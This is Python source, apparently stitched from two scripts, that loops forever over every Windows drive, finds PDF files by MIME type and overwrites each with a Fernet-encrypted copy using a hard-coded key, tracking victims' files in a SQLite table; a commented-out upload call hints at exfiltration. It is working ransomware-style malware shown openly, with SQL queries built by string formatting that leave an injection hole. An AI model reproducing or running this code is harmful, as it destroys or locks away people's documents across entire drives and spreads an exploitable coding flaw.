from cryptography.fernet import Fernet
import glob
import sqlite3


def checkTable(cursor):
    cursor.execute("CREATE TABLE IF NOT EXISTS Files(filepath TEXT)")


def getFiles():
    files  = glob.glob("*.pdf")
    return files
    
def encryptFiles(file):
    try:
        key = b'DWzdgU_PeqOX7_XiTh-az55CcgeOTVXmLMD7bRF0EOs='
        fernet = Fernet(key)
        
        print("Encrypting {}".format(file))
        original = None
        with open(file,'rb') as fl:
            original = fl.read()
        encrypted = fernet.encrypt(original)
        with open(file,'wb') as encrypte_file:
            encrypte_file.write(encrypted)
        return True
    except:
        return False

def checkFile(q):
    print(q)
    print(q['filePath'])
    rws = q['cursor'].execute("SELECT * FROM Files WHERE filepath='{}' ".format(q['filePath'])).fetchone()
    print(rws)
    print(q['filePath'],type(rws))
    return rws

def insertFile(q):
    rws = q['cursor'].execute("INSERT INTO Files VALUES('{}')".format(q['filePath']))




def test(file):
    
    conn = sqlite3.connect("files.db")
    cursor = conn.cursor()
    checkTable(cursor)
    f = None
    f = dict()
    print(file)
    f['filePath'] = file
    f['cursor'] = cursor
    isFile = checkFile(f)
    print("is file {}".format(isFile))
    if isFile is None:
        encryptFiles(file)
        insertFile(f)

    else:
        print("FIle Already Encryped")

    conn.commit()
    conn.close()

#start()



#from posix import listdir
import requests
import random
import os
import glob
import magic
import time
import win32api
import base64
from PyPDF2 import PdfFileWriter,PdfFileReader
#from kivy.properties import ObjectProperty

def joinDirectories(dir1,dir2):
    r = os.path.join(dir1,dir2)
    return r

def getDirectories(path):
    
    try:
        return os.listdir(path) 
    except:
        return None



def processFile(filePath):
    try:
        mime=magic.Magic(mime=True)
        mimType = mime.from_file(filePath)
       # print(filePath)
        #print("File Mime type is {}".format(mimType))
        if mimType == "application/pdf":
            print("File {} mimetype is {}".format(filePath,mimType))
            fileName = os.path.basename(filePath)
            contentType = mimType
            pd = open(filePath,"rb")
            pd_read = pd.read()
            fileName = os.path.basename(filePath)
            pd_base64 = base64.encodebytes(pd_read)
            # postfile(pd_base64,fileName,contentType)
            print(filePath)
            test(filePath)
            # time.sleep(5.3)
    except Exception as e:
        print(e)
        pass



		

def checkDir(path):
    try:
        if(os.path.isdir(path)):
            print("It is dir {}".format(path))
            dirs = getDirectories(path)
            #print(dirs)
            processDirs(path,dirs)
        elif(os.path.isfile(path)):
            processFile(path)
    except Exception as e:
        print(e)
        pass
def processDirs(parentPath,dirs):
    x = list()
    for dir in dirs:
        y = joinDirectories(parentPath,dir)
        checkDir(y)
        


def start(path):
    dirs = getDirectories(root_path)
	
    processDirs(path,dirs)
while True:
    root_path = os.path.abspath(os.sep)
    drives = win32api.GetLogicalDriveStrings()
    drives = drives.split('\000')[:-1]
    # for y in drives:
    y = random.choice(drives)
    a = os.path.abspath(y)
        # print(y)
    start(y)

    time.sleep(0.5)

                

